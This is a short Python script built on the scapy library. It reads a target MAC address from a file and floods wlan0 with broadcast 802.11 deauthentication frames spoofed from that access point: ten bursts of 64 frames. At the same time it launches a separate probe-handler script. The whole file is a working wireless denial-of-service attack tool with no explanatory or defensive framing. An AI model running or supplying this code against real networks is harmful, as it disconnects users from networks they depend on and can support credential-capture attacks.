from scapy.all import *
import time
import threading
import os


file = open("info.txt" , "r")
mac = file.readlines()
file.close()
 
t = True
name=[]

#frame = RadioTap()/Dot11(type = 0, subtype = 12, addr1 = "ff:ff:ff:ff:ff:ff", addr2 = str(mac[0]), addr3 = str(mac[0]))/Dot11Deauth()

def deauth():
	i=0
	frame = RadioTap()/Dot11(type = 0, subtype = 12, addr1 = "ff:ff:ff:ff:ff:ff", addr2 = str(mac[0]), addr3 = str(mac[0]))/Dot11Deauth()
	while i<10:
		sendp(frame, iface= "wlan0", count= 64)
		time.sleep(1)
		i=i+1

def probe():
	print "Hello"
	os.system("python probehandler.py")
	


	




t1 = threading.Thread(target = deauth)
t2 = threading.Thread(target = probe)
t1.start()
t2.start()
